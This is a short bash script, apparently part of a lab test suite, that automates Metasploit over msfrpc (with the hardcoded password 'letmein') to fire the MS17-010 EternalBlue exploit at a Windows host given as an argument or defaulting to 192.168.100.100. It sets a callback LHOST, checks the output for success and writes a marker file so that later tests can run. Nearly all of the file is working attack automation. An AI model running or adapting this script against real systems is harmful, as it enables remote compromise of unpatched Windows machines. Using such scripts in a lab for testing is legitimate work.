#!/bin/bash 

# we create this file so that tests that depend on this test can 
# know that this test was ok and they can continue, else skip
REQFILE="ebsessiongood.var"
if [ -f $REQFILE ]
then
	echo "Requisite file found already pwned, SKIP"
	exit 0
fi


# remote host windows target, change this if you want to attack different machine
# to attack a different target simply pass ip as first arg to this script
if [ -z $1 ]; then 
	rhost="192.168.100.100" # default target to attack, change as needed
else
	rhost="$1"
fi

lhost=$(ip route get 192.168.100.100 | grep dev | cut -d' ' -f5)  # 10.222.222.45

echo rhost: $rhost lhost: $lhost

msfrpc -a 127.0.0.1 -P letmein <<EOF
irb_context.echo = false
rpc.call('console.create')
rpc.call('console.write', 0, "use exploits/windows/smb/ms17_010_eternalblue\r\n")
rpc.call('console.write', 0, "set RHOSTS $rhost\r\n")
rpc.call('console.write', 0, "set LHOST $lhost\r\n")
puts rpc.call('console.read', 0)
rpc.call('console.write', 0, "exploit -z\r\n")
busy = rpc.call('console.list')['consoles'][0]['busy']
while busy do sleep 2; busy = rpc.call('console.list')['consoles'][0]['busy'] end
data = rpc.call('console.read', 0)['data']
puts data
exit if data.include? '=-WIN-='
abort
EOF

EXITCODE=$?

if [ $EXITCODE -eq 0 ]; then
	touch $REQFILE
fi


